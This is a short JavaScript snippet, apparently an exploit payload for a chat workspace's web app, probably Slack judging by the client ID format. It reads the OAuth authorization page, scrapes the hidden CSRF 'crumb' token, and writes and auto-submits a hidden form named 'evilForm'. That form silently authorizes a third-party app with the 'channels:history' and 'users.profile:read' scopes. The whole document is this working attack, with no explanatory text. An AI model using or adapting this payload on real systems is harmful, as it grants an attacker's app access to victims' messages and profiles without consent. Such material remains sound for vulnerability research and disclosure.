fetch(location.origin + "/oauth/authorize?scope=channels:history+users.profile:read&client_id=496141141553.514835337734").then(function(response) {
    response.text().then(function (text) {
                var oauthPath = text.split('<noscript><meta http-equiv="refresh" content="0; URL=')[1].split('?')[0];
        fetch(location.origin + oauthPath).then(function(response){
                        response.text().then(function (text) {
                                var crumb = text.split('type="hidden" name="crumb" value="')[1].split('"')[0];
                                var evilForm = `<form id="potatoCarrots" action="${oauthPath}" method="post" accept-encoding="UTF-8"><input type="hidden" name="create_authorization" value="1" /><input type="hidden" name="crumb" value="${crumb}" /></form><script>document.getElementById('potatoCarrots').submit()</script>`

                                document.write(evilForm)
            })
        })
    });
  })
